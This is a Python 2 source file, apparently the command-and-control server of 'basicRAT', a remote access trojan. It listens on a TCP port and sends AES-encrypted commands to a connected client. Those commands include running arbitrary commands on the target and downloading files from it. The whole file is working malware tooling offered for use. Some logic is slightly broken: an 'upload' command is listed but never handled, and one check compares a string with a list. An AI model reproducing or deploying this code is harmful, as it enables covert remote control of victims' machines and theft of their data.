#!/usr/bin/env python
# -*- coding: utf-8 -*-


import argparse
import readline
import socket
import sys
import time


# ascii banner (Crawford2) - http://patorjk.com/software/taag/
# ascii rat art credit - http://www.ascii-art.de/ascii/pqr/rat.txt
BANNER = '''
 ____    ____  _____ ____   __  ____    ____  ______      .  ,
|    \  /    |/ ___/|    | /  ]|    \  /    ||      |    (\;/)
|  o  )|  o  (   \_  |  | /  / |  D  )|  o  ||      |   oo   \//,        _
|     ||     |\__  | |  |/  /  |    / |     ||_|  |_| ,/_;~      \,     / '
|  O  ||  _  |/  \ | |  /   \_ |    \ |  _  |  |  |   "'    (  (   \    !
|     ||  |  |\    | |  \     ||  .  \|  |  |  |  |         //  \   |__.'
|_____||__|__| \___||____\____||__|\_||__|__|  |__|       '~  '~----''
         https://github.com/vesche/basicRAT
'''
HELP_TEXT = '''
download <file> - Download a file.
help            - Show this help menu.
run <command>   - Execute a command on the target.
upload <file>   - Upload a file.
quit            - Gracefully kill client and server.
'''


def get_parser():
    parser = argparse.ArgumentParser(description='basicRAT server')
    parser.add_argument('-c', '--crypto',
                        help='C2 crypto to use.',
                        default='AES', type=str)
    parser.add_argument('-p', '--port',
                        help='Port to listen on.',
                        default=1337, type=int)
    return parser


def main():
    parser  = get_parser()
    args    = vars(parser.parse_args())
    port    = args['port']
    crypto  = args['crypto']
    
    if crypto == 'AES':
        from common import AES_encrypt as encrypt
        from common import AES_decrypt as decrypt
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.bind(('0.0.0.0', port))
    except socket.error:
        print 'Error: Unable to start server, port {} in use?'.format(port)
        sys.exit(1)

    for line in BANNER.split('\n'):
        time.sleep(0.05)
        print line

    print 'basicRAT server listening on port {}...\n'.format(port)

    s.listen(10)
    conn, _ = s.accept()

    while True:
        prompt = raw_input('basicRAT> ').rstrip().split()

        # allow noop
        if prompt == []:
            continue

        # seperate prompt into command and action
        cmd, action = prompt[0], ' '.join(prompt[1:])

        # allow no action
        if action == []:
            action = ''

        # send data to client
        data = '{} {}'.format(cmd, action).rstrip()
        conn.send(encrypt(data))

        # stop server
        if cmd == 'quit':
            s.close()
            sys.exit(0)

        # display help text
        elif cmd == 'help':
            print HELP_TEXT

        # results of command
        elif cmd == 'run':
            recv_data = conn.recv(4096)
            print decrypt(recv_data)

        # download a file
        elif cmd == 'download':
            f_name = action.split()[0]

            with open(f_name, 'wb') as f:
                while True:
                    recv_data = conn.recv(1024)
                    if not recv_data:
                        break
                    f.write(decrypt(recv_data))


if __name__ == '__main__':
    main()
